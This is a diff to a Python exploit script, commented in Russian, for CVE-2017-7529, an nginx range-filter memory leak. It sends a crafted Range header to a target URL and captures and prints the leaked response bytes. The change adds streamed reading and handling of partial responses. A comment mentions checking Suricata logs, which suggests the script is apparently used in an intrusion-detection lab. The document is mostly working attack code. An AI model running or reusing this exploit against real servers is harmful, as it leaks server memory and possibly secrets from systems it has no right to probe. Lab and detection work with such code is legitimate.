@@ -32,16 +32,40 @@ headers['Range'] = "bytes=-%d,-%d" % (
 print(f"[*] Отправка Range запроса...")
 print(f"[*] Range заголовок: {headers['Range']}")
 try:
-    # Увеличиваем таймаут для Range запроса, так как уязвимость может обрабатываться дольше
-    r = requests.get(url, headers=headers, timeout=30)
-    print(f"[+] Получен ответ (статус: {r.status_code}, размер: {len(r.content)} байт)")
-    print("=" * 60)
-    print(r.text)
-    print("=" * 60)
+    # Используем stream=True и большой таймаут для Range запроса
+    # Уязвимость CVE-2017-7529 может обрабатываться долго
+    r = requests.get(url, headers=headers, timeout=(10, 60), stream=True)
+    print(f"[+] Получен ответ (статус: {r.status_code})")
+    
+    # Читаем содержимое по частям
+    content = b""
+    try:
+        for chunk in r.iter_content(chunk_size=8192, decode_unicode=False):
+            if chunk:
+                content += chunk
+        print(f"[+] Размер полученного контента: {len(content)} байт")
+        print("=" * 60)
+        # Пытаемся декодировать как текст
+        try:
+            text = content.decode('utf-8', errors='ignore')
+            print(text)
+        except:
+            print(content[:1000])  # Выводим первые 1000 байт в hex/raw формате
+        print("=" * 60)
+    except requests.exceptions.ChunkedEncodingError:
+        # Если произошла ошибка при чтении, но ответ начал приходить - это может быть успех
+        print(f"[!] Частичный ответ получен: {len(content)} байт")
+        if content:
+            try:
+                print(content.decode('utf-8', errors='ignore'))
+            except:
+                print(content[:1000])
 except requests.exceptions.Timeout as e:
     print(f"[-] Таймаут Range запроса: {e}")
     print("[!] Это может быть нормальным для данной уязвимости - сервер может обрабатывать запрос долго")
-    sys.exit(1)
+    print("[!] Попробуйте проверить логи Suricata для обнаружения атаки")
+    # Не завершаем с ошибкой, так как таймаут может быть ожидаемым
+    sys.exit(0)
 except requests.exceptions.RequestException as e:
     print(f"[-] Ошибка Range запроса: {e}")
     sys.exit(1)
